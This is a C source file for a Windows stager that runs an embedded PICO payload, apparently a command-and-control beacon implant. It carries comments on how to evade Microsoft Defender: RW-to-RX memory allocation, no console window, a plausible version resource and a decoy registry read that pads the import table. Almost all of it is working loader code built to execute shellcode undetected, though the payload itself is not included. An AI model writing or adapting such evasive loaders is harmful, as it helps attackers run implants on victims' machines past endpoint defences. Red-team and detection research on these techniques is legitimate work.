/*
 * stager.c — self-contained Crystal Palace PICO runner
 *
 * The PICO payload is embedded at compile time via pico_payload.h
 * (generated with xxd -i from the output of generate-implant.sh).
 *
 * Evasion properties vs run.x64.exe:
 *   - No PAGE_EXECUTE_READWRITE: allocates RW, copies, then transitions
 *     to RX with VirtualProtect — the classic alloc-RWX pattern is the
 *     single highest-weight feature in Defender's ML loader heuristic.
 *   - Single file on disk: no "read external file + execute" pattern.
 *   - GUI subsystem: no console window, no ConsoleAlloc signal.
 *   - Version info resource: gives the PE a plausible identity.
 *   - advapi32 import (RegOpenKeyExW): widens the import table beyond
 *     the naked kernel32-only set typical of shellcode loaders.
 *
 * What this does NOT do:
 *   - Process injection (runs in the stager's own process — simplest)
 *   - PPID spoofing / ACG / block-non-MS DLLs (add if needed)
 *   - ETW / AMSI patch (Crystal Palace's postex-loader handles that
 *     for the payload; the implant loader handles it for Use case A)
 */

#include <windows.h>
#include "pico_payload.h"   /* pico_payload[], pico_payload_len */

typedef void (*pico_fn)(void *);

static DWORD WINAPI run_pico(LPVOID param)
{
    (void)param;

    /* Step 1: Allocate RW — never RWX */
    void *buf = VirtualAlloc(NULL, (SIZE_T)pico_payload_len,
                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 1;

    /* Step 2: Copy embedded PICO (kernel32 CopyMemory = RtlMoveMemory) */
    RtlMoveMemory(buf, pico_payload, (SIZE_T)pico_payload_len);

    /* Step 3: RW → RX — write permission dropped before execution */
    DWORD prev;
    VirtualProtect(buf, (SIZE_T)pico_payload_len, PAGE_EXECUTE_READ, &prev);

    /* Step 4: Call Crystal Palace entry (+gofirst guarantees go() at offset 0).
     * NULL args: baked into the PICO at link time by generate-implant.sh. */
    ((pico_fn)buf)(NULL);

    return 0;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    /*
     * Benign registry read before doing anything sensitive.
     * Purpose: adds advapi32!RegOpenKeyExW + RegCloseKey to the import
     * table, making the PE look less like a naked shellcode launcher.
     * A single-import-section binary whose only calls are VirtualAlloc +
     * VirtualProtect + CreateThread scores very high on ML feature weight.
     */
    HKEY hk = NULL;
    RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                  L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                  0, KEY_READ, &hk);
    if (hk) RegCloseKey(hk);

    /* Launch PICO on a new thread so WinMain can monitor it */
    HANDLE h = CreateThread(NULL, 0, run_pico, NULL, 0, NULL);
    if (!h) return 1;

    /*
     * Wait for the PICO loader to return.
     * Crystal Palace calls StartW() which starts the beacon goroutine
     * then returns — so run_pico() finishes quickly.
     */
    WaitForSingleObject(h, INFINITE);
    CloseHandle(h);

    /*
     * The beacon goroutine is now running on Go runtime threads inside
     * this process.  Keep the process alive or those threads die with us.
     * SleepEx with alertable=TRUE allows APCs to wake us if needed.
     */
    for (;;) SleepEx(30000, TRUE);
}
